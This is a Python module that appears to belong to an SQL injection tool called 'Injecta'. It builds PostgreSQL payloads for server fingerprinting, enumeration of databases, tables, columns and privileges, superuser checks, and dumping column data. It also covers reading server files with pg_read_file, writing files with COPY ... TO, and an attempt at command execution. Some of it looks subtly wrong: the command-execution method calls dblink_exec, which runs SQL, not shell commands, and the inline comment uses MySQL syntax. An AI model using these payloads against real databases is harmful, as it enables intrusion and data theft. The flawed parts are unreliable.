"""
Injecta — PostgreSQL payload provider
"""
from typing import List


class PostgreSQLPayloads:
    name = "postgresql"
    comment = "-- "
    inline_comment = "/*!*/"

    @staticmethod
    def version() -> List[str]:
        return [
            "SELECT version()",
            "SELECT current_setting('server_version')",
        ]

    @staticmethod
    def databases() -> List[str]:
        return [
            "SELECT datname FROM pg_database",
        ]

    @staticmethod
    def tables(db: str) -> List[str]:
        return [
            "SELECT tablename FROM pg_tables WHERE schemaname='public'",
            f"SELECT tablename FROM pg_tables WHERE tableowner=(SELECT usename FROM pg_catalog.pg_user WHERE usesysid=(SELECT usesysid FROM pg_catalog.pg_user WHERE usename='{db}'))",
        ]

    @staticmethod
    def columns(db: str, table: str) -> List[str]:
        return [
            f"SELECT column_name FROM information_schema.columns WHERE table_catalog='{db}' AND table_name='{table}'",
            f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        ]

    @staticmethod
    def dump_column(db: str, table: str, column: str, limit: int = 0) -> List[str]:
        q = f"SELECT {column} FROM {table}"
        if limit > 0:
            q += f" LIMIT {limit}"
        return [q]

    @staticmethod
    def current_user() -> List[str]:
        return ["SELECT current_user", "SELECT user"]

    @staticmethod
    def current_db() -> List[str]:
        return ["SELECT current_database()"]

    @staticmethod
    def count_tables(db: str) -> List[str]:
        return ["SELECT COUNT(*) FROM pg_tables WHERE schemaname='public'"]

    @staticmethod
    def count_columns(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}'"]

    @staticmethod
    def count_rows(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM {table}"]

    @staticmethod
    def banner() -> List[str]:
        return ["SELECT version()"]

    @staticmethod
    def is_admin() -> List[str]:
        return [
            "SELECT usesuper FROM pg_user WHERE usename=current_user",
            "SELECT 1 FROM pg_roles WHERE rolname=current_user AND rolsuper=true",
        ]

    @staticmethod
    def privileges() -> List[str]:
        return [
            "SELECT grantee, privilege_type FROM information_schema.role_column_grants WHERE grantee=current_user",
            "SELECT rolname FROM pg_roles WHERE pg_has_role(current_user, oid, 'member')",
        ]

    @staticmethod
    def file_read(path: str) -> List[str]:
        return [
            f"SELECT pg_read_file('{path}')",
            f"SELECT convert_from(pg_read_binary_file('{path}'), 'UTF8')",
        ]

    @staticmethod
    def file_write(path: str, content: str) -> List[str]:
        return [
            f"COPY (SELECT E'{content}') TO '{path}'",
        ]

    @staticmethod
    def os_cmd(cmd: str) -> List[str]:
        return [
            f"SELECT dblink_exec('dbname=postgres', '{cmd}')",
        ]
